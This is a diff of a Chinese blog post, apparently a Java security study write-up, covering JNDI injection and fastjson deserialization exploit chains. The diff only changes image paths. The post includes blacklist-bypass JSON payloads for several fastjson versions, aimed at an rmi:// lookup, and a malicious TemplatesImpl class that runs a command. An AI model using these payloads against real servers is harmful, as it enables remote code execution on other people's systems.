@@ -212,13 +212,13 @@
 <p>首先运行服务端，然后再运行客户端，就能获得远程类的调用结果</p>
 </li>
 </ol>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114145308362.png" alt></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114145308362.png" alt></p>
 <p>​        通过运行getclass方法，可以看到，客户端接收到的hello类实际上是一个服务器发送过来的代理类，可以称为存根(Stub)，其中含有服务端的IP和通信端口，该端口不是1099端口，而是一个服务端用来和客户端传递调用类的名字、参数、运行结果等信息的新端口。1099端口是一个Registry注册服务，它只负责将注册表中对应类的存根(Stub)信息发送给客户端。</p>
 <p>​        那么对于一个正常的类，远程调用的过程就很明了了，首先 与服务端的Registry注册服务端口(1099)通信，在注册表上查询将要调用的类(这里是aa)，然后服务端返回该类的代理，也就是Stub，客户端通过存根中的IP、端口信息将自己想要调用的方法与参数传递到服务端，在服务端调用对应的方法并返回结果。</p>
 <h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>​        LDAP是一种树形储存的数据库，可以起到和RMI注册表类似的功能。</p>
 <h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​        可以用JAVA模拟一个LDAPRef服务端，<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
 <h3 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>​        JNDI全名为Java Naming and Directory Interface.JNDI主要提供应用程序所需要资源上命名与目录服务，意思就是给资源绑定一个名字，用户可以通过该名字来访问资源，它支持解析rmi协议和ldap协议，这也是漏洞触发的点。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114153614320.png" alt="image-20210114153614320"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114153614320.png" alt="image-20210114153614320"></p>
 <p>​        JDNI注入是在它的loopup方法参数能够任意控制的情况下，导致服务器加载恶意rmi服务器、ldap服务器中的恶意类，导致任意命令执行，所以它在RMI协议中充当客户端，但是上文不是说RMI是在服务端执行方法，然后返回到客户端吗，这岂不是自己打自己？对于正常的类本地类，确实是这样，但是当RMI、LDAP服务端服务端绑定了一个Reference远程类时，客户端会有不同的处理，这里就用RMI做一个实例。</p>
 <ul>
 <li>搭建恶意服务端</li>
@@ -236,20 +236,20 @@
 
 <p>运行服务端，然后运行客户端，就会看到计算机弹了出来，命令执行成功在，lookup打个断点调试一下。</p>
 <p>进入到GenericURLContext.class</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114161930253.png" alt="image-20210114161930253"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114161930253.png" alt="image-20210114161930253"></p>
 <p>var2调用getRootContext方法，解析RMI协议，返回一个ResolveResult对象，该对象中实例化了一个RegistryContext对象，含有服务端端口，IP等信息，并将它们用tcp协议封装好，放到<code>this.registry</code>属性中。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114165847814.png" alt="image-20210114165847814"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114165847814.png" alt="image-20210114165847814"></p>
 <p>var3获取到该RegistryContext对象，并调用lookup方法去注册中心寻找对象。</p>
 <p>进入到RegistryContext.class</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114165325247.png" alt="image-20210114165325247"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114165325247.png" alt="image-20210114165325247"></p>
 <p>这里调用上文说的registry对象的lookup方法，从Registry服务器上获得搜索对象的Stub信息，之后进入到decodeObject方法。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114170651776.png" alt="image-20210114170651776"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114170651776.png" alt="image-20210114170651776"></p>
 <p>我们可以注意到，在这里服务端给我们返回的是62786端口，这个端口才是我们与服务端JVM通信的端口，随后进入到NamingManager.getObjectInstance方法，这里就是正常类和远程Reference类的分界线。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114171408647.png" alt="image-20210114171408647"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114171408647.png" alt="image-20210114171408647"></p>
 <p>这里的refInfo就是我们从存根中获取的类名，可以看到，当它是一个Reference类是，会对ref进行赋值，随后通过if判断进入到命令执行点，我打的两个端点就是两个命令执行的地方，首先第一个，进入到getObjectDactoryFromReference函数中。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114171704458.png" alt="image-20210114171704458"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114171704458.png" alt="image-20210114171704458"></p>
 <p>这里使用codebase的方式加载远程的恶意类加载，恶意类的Web段也会受到一个请求，我这里试了很多次，所以有很多。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114172344266.png" alt="image-20210114172344266"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114172344266.png" alt="image-20210114172344266"></p>
 <p>然后用newInstance方法将它实例化，所以我们只需要在他的实例化方法中插入命令执行代码，即可成功命令执行，这一切都会在本地发生，随后进入第二处，它会在此处执行该类的getObjectInstance方法.</p>
 <p>到这里，命令执行就已经完成，这就是JDNI注入的原理(通过控制lookup参数，加载恶意远程Reference类，导致任意代码执行)</p>
 <h4 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h4><h5 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h5><p>在jdk版本8u112之后，rmi的com.sun.jndi.rmi.object.trustURLCodebase默认为false，不再支持从陌生Codebase加载类了。</p>
@@ -273,49 +273,49 @@
 <p>运行JsonText即可执行自己想要的命令。</p>
 <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h5><p>调试进入parseObject方法</p>
 <p>JSON.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114201749334.png" alt="image-20210114201749334"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114201749334.png" alt="image-20210114201749334"></p>
 <p>​        这里将json字符串DefaultJSONParser类的parse方法处理，跟入</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114202827940.png" alt="image-20210114202827940"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114202827940.png" alt="image-20210114202827940"></p>
 <p>​        可以看到，JSON字符串的解析主要是靠这个lexer词法分析器完成，他在实例化DefaultJSONParser的时候被初始化，它的工作原理是不断递归的找到JSON字符串中的关键字<code>&quot;{}&quot;[]&quot;</code>等等，不同的关键字有着不同的操作符，操作符存放在token中，在初始化的时候找到了第一个<code>{</code>，所以token被赋值为LBRACE(12)</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114203506919.png" alt="image-20210114203506919"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114203506919.png" alt="image-20210114203506919"></p>
 <p>​        所以直接进入到对应的处理方式</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114203643905.png" alt="image-20210114203643905"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114203643905.png" alt="image-20210114203643905"></p>
 <p>​        接着进入到了parseObject方法，在这里lexer会不断往后分析，详细过程也比较简单，我这里就不细说了，有兴趣可以自己去读读源码，这里直接说漏洞关键触发点，在parseObject中，有一个特殊的@type关键字，我们可以在这里实现任意类的加载，那么为什么要有这么一个关键字呢，可以看看大师傅的文章<a href="https://baijiahao.baidu.com/s?id=1671603044044877345&wfr=spider&for=pc" target="_blank" rel="noopener">fastjson到底做错了什么？为什么会被频繁爆出漏洞</a>，我这里就不再赘述了。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114210225738.png" alt="image-20210114210225738"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114210225738.png" alt="image-20210114210225738"></p>
 <p>​        解析到@type关键字，进入if语句，typeName就是我们想要加载的类com.sun.rowset.JdbcRowSetImpl，跟入loadclass方法</p>
 <p>​        TypeUtils.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114210552059.png" alt="image-20210114210552059"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114210552059.png" alt="image-20210114210552059"></p>
 <p>​        通过类加载器加载该类，并将他加入到mappings中，继续跟进，到getDeserializer方法中。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114210858829.png" alt="image-20210114210858829"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114210858829.png" alt="image-20210114210858829"></p>
 <p>​        可以看到，它将该类的反序列化交给JavaBeanDeserializer完成</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114211101379.png" alt="image-20210114211101379"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114211101379.png" alt="image-20210114211101379"></p>
 <p>​        继续跟入，这里使用了asm的方式来反序列化类，代码又臭又长，前面一大堆就是判断是否能使用asm来反序列化该类。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114212554378.png" alt="image-20210114212554378"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114212554378.png" alt="image-20210114212554378"></p>
 <p>​        直接来到该函数的末尾</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114213859235.png" alt="image-20210114213859235"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114213859235.png" alt="image-20210114213859235"></p>
 <p>​        这里调用了JavaBeanInfo.build方法，该方法的作用是反射获取该类(com.sun.rowset.JdbcRowSetImpl)的一些信息，包括默认构造器、fieldList等，filedList中包含了反序列化时所有允许调用的方法，那么什么样的方法会被调用呢，fileList在JavaBeanInfo.java 328行的for循环处理中被定义，methods为该类的所有方法，当该方法名满足长度大于4、非静态、Void类型或者返回当前class、只含有一个参数、方法名以set或者get开头等等。</p>
 <p>JavaBeanInfo.java </p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210115170121384.png" alt="image-20210115170121384">        然后调用createJavaBeanInfo.build方法根据BeanInfo中的信息实例化Deserializer类，为反序列化做准备。</p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210115170121384.png" alt="image-20210115170121384">        然后调用createJavaBeanInfo.build方法根据BeanInfo中的信息实例化Deserializer类，为反序列化做准备。</p>
 <p>​        ASMDeserializerFactory.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114214247159.png" alt="image-20210114214247159"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114214247159.png" alt="image-20210114214247159"></p>
 <p>然后一路return又回到最开始，最后调用deserializer类的deserialize方法进行开始反序列化。</p>
 <p>DefaultJSONParser.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114221931620.png" alt="image-20210114221931620"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114221931620.png" alt="image-20210114221931620"></p>
 <h6 id="fastjson反序列化流程"><a href="#fastjson反序列化流程" class="headerlink" title="fastjson反序列化流程"></a>fastjson反序列化流程</h6><p>​        在反序列化过程中，lexer词法分析器会继续解析键值对，如果在之前在beaninfo中筛选的<code>fieldList</code>方法中含有key，就会通过反射调用对应的方法，在这里就对应执行JdbcRowSetImpl类中的setdataSourceName方法和setautoCommit方法，并将值作为参数传递过去，如果碰到key不属于fieldlist，就会根据key值在该类定义的所有变量中寻找，如果对于变量的类型是基础类型，就将value赋与它，如果变量的类型是其他对象时，将会反序列化该类，并调用它的构造方法来完成赋值。</p>
 <p>JdbcRowSetImpl.class</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114223056311.png" alt="image-20210114223056311"></p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114223112008.png" alt="image-20210114223112008"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114223056311.png" alt="image-20210114223056311"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114223112008.png" alt="image-20210114223112008"></p>
 <p>重点来了，可以看到setAutoCommit时，调用了一次this.connect方法，跟入进去</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210114223247356.png" alt="image-20210114223247356"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210114223247356.png" alt="image-20210114223247356"></p>
 <p>​        这不就是我们一直当作教学的受害RMI客户端代码吗！这里getDataSourceName就是我们通过setdataSourceName设置的dataSourceName.</p>
 <p>这就是JdbcRowSetImpl利用链任意代码执行的全过程了，看完之后是不是也觉得比较简单呢。</p>
 <h5 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h5><p>​        首先分析一下链子，<code>_bytecodes</code>中的内容是恶意类编译出来的class文件经过base64加密后的密文，这里为什么是base64呢，fastjson在对应变量类型为字节码的时候，为了方便传输，会使用base64加密传送，取出来的时候也会进行一次解密。</p>
 <p>​        这条链子的漏洞点在TemplatesImpl.java中的getOutputProperties方法。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210115202049192.png" alt="image-20210115202049192"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210115202049192.png" alt="image-20210115202049192"></p>
 <p>​        这里跟入newTransformer方法中，继进入续跟入到getTransletInstance方法中,这里_name如果为空的话，直接就返回了，所以我们在反序列化时也需要给它赋值。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210115204157601.png" alt="image-20210115204157601"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210115204157601.png" alt="image-20210115204157601"></p>
 <p>​        首先进入defineTransletClasses中加载恶意类</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210115203523242.png" alt="image-20210115203523242"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210115203523242.png" alt="image-20210115203523242"></p>
 <p>​        在这里会从_bytecodes字节流中加载我们的恶意类，可以看到，在这里该类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类的子类，然后程序会对它进行实例化，从而完成我们的攻击。</p>
 <p>​        恶意类ExecTest.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd=<span class="string">"calc"</span>;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ss"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -327,42 +327,42 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String test = <span class="string">"&#123;\"name\":&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/aa\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>断点调试跟入到DefaultJSONParser.java 308行。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119114835831.png" alt="image-20210119114835831"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119114835831.png" alt="image-20210119114835831"></p>
 <p>这里对我们的类多了一个chekcAutoType检查，跟入。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119115149710.png" alt="image-20210119115149710"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119115149710.png" alt="image-20210119115149710"></p>
 <p>​        这里首先对类名做白名单检查(acceptList)，然后再做黑名单检查(denyList)，并且检查的时候使用的startsWith函数，如果黑名单检测通过，则进入类的加载步骤，跟入TypeUtils.loadclass方法。</p>
 <p>TypeUtils.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119223020317.png" alt="image-20210119223020317"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119223020317.png" alt="image-20210119223020317"></p>
 <p>​        在这里会对类名进行一定处理，可以看到他在这里首先去掉了类名前的<code>L</code>和后面的<code>;</code>，然后再加载该类，所以我们可以在类前面和后面添加<code>L</code>和<code>;</code>就能绕过黑名单检测。</p>
 <h5 id="version-1-2-42"><a href="#version-1-2-42" class="headerlink" title="version==1.2.42"></a>version==1.2.42</h5><p>​    payload(该payload只有在1.2.42才能使用)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/aa&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​    在此版本，fastjson将黑名单换成了十进制，代码更加难以读懂了，我们直接就进入checkoutput函数吧。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119224603758.png" alt="image-20210119224603758"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119224603758.png" alt="image-20210119224603758"></p>
 <p>​    在这里将字符中的第一个和最后一个进行hash处理之后，与某个值进行比较，如果符合就进入if语句，将className的第一个和最后一个字符去掉，代码虽然难看，但是调试一下就知道，这里是当className以<code>L</code>开头<code>;</code>结尾时，就去掉它，但是后面处理的逻辑没变，而这就导致了双写<code>LL;;</code>绕过。</p>
 <h5 id="version-1-2-43"><a href="#version-1-2-43" class="headerlink" title="version==1.2.43"></a>version==1.2.43</h5><p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/aa&quot;,&quot;autoCommit&quot;:true]&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​    这里修复了1.2.42中的双写绕过，如果类名满足LL;;，直接抛出异常，那么这里就无法在进行利用了，只能寻找其他利用方式，由于主要逻辑没变，我们直接跟入TypeUtils.loadClass方法。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119225830471.png" alt="image-20210119225830471"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119225830471.png" alt="image-20210119225830471"></p>
 <p>​        当类名以<code>[</code>开头，是数组是，进入了特殊的数组处理，这里调用了Array.newInstance方法来实例化该类，相应的，之后反序列化的方式也发生了变化，直接跟入初始化反序列化器。</p>
 <p>ParserConfig.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119230946716.png" alt="image-20210119230946716"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119230946716.png" alt="image-20210119230946716"></p>
 <p>​        这里使用了ObjectArrayCodec来反序列化该类，继续跟入。</p>
 <p>DefaultJSONParser.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119231105201.png" alt="image-20210119231105201"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119231105201.png" alt="image-20210119231105201"></p>
 <p>​        进入ObjectArrayCodec反序列化流程，首先它调用了parseArray。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119231858278.png" alt="image-20210119231858278"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119231858278.png" alt="image-20210119231858278"></p>
 <p>这里判断下一个关键字必须要是<code>[</code>，然后还是和之前一样用ASM的反序列化生成该类的class文件，实现命令执行。</p>
 <h5 id="version-lt-1-2-48"><a href="#version-lt-1-2-48" class="headerlink" title="version&lt;1.2.48"></a>version&lt;1.2.48</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;name2&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://127.0.0.1:1099/aa&quot;, &quot;autoCommit&quot;: true&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​        这个payload在不开启@type模式下也可以进行利用，首先解释一下，关闭autoTypeSupport模式并不是完全阻止了类的加载，而是阻止了任意类的加载，但是在map中定义的和在deserialize类中的类还是会进行加载的。</p>
 <p>ParserConfig.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119234243689.png" alt="image-20210119234243689"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119234243689.png" alt="image-20210119234243689"></p>
 <p>​        如果未开启autoType，则会调用deserializers.findclass中寻找该类，我们可以从这里加载到java.lang.Class类，并且以MiscCodec方式反序列化，跟入MiscCodec.java</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119235013749.png" alt="image-20210119235013749"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119235013749.png" alt="image-20210119235013749"></p>
 <p>​        这里会在在payload中寻找val对应的值，在这里也就是我们想要加载的恶意类<code>com.sun.rowset.JdbcRowSetImpl</code>，然后由于之前的类是Java.lang.class，这里就直接调用TypeUtils.loadClass加载该类，之后重复一遍反序列化过程，完成命令执行。</p>
-<p><img src="E:%5Cimages%5CJavaWeb%E4%B8%93%E9%A2%98%5Cimage-20210119235258069.png" alt="image-20210119235258069"></p>
+<p><img src="/images/JavaWeb%E4%B8%93%E9%A2%98/image-20210119235258069.png" alt="image-20210119235258069"></p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>​        目前网上出现的fastjson反序列化漏洞到这里基本复现完成了，这也算我的java代码审计入门篇，从学习RMI和JNDI注入到审计fastjson代码，总共花了四天左右，最难的就是前期的代码审计了，因为对框架陌生、而且Java安全也不是很熟悉，所以花了较长时间理解fastjson的java反序列化流程，经过这次审计，对Java安全有了一点概念，感觉代码审计非常有意思，令人上瘾，2333。</p>
 <h2 id="JAVA反序列化链"><a href="#JAVA反序列化链" class="headerlink" title="JAVA反序列化链"></a>JAVA反序列化链</h2><h3 id="Groovy反序列化链"><a href="#Groovy反序列化链" class="headerlink" title="Groovy反序列化链"></a>Groovy反序列化链</h3><h4 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​        Groovy反序列化链漏洞影响范围是<code>1.7.0&lt;=version&lt;=2.4.3</code>，我们这里用maven搭建一个2.3.9的groovy环境。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
